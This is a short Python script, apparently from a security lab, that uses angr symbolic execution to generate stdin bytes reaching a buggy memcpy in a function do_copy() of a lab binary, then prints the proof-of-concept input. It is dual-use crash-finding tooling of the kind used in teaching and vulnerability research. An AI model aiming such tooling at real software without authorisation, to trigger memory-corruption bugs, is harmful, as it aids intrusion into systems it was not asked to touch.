#!/usr/bin/env python3
"""Synthesize an input for `parser` that reaches do_copy().

Usage:  find_crash.py [BINARY]      (default: ./parser-x86_64)
Writes the concrete POC bytes to stdout, a hex summary to stderr.
"""
import angr, claripy, sys

BIN = sys.argv[1] if len(sys.argv) > 1 else './parser-x86_64'

p = angr.Project(BIN, auto_load_libs=False)
INBUF = 64
inp = claripy.BVS('inp', INBUF * 8)                       # ❶
state = p.factory.entry_state(
    stdin=angr.SimFileStream(name='stdin', content=inp, has_end=True))

# The buggy memcpy sits at this address in the lab binary; check with
# nm parser | grep do_copy   (an offset works if the binary is stripped).
crash_addr = p.loader.find_symbol('do_copy').rebased_addr

simgr = p.factory.simgr(state, save_unconstrained=True)   # ❷
simgr.explore(find=crash_addr)

if simgr.found:
    poc = simgr.found[0].solver.eval(inp, cast_to=bytes)
    sys.stdout.buffer.write(poc)                          # ❸ real bytes, ready to feed
    print(f'\n[+] poc {len(poc)} bytes: {poc.hex()}', file=sys.stderr)
else:
    sys.exit('no state reached do_copy')
